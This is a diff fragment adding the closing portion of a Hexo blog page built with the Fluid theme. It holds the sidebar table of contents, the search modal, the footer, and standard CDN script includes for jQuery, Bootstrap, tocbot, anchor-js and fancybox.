+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
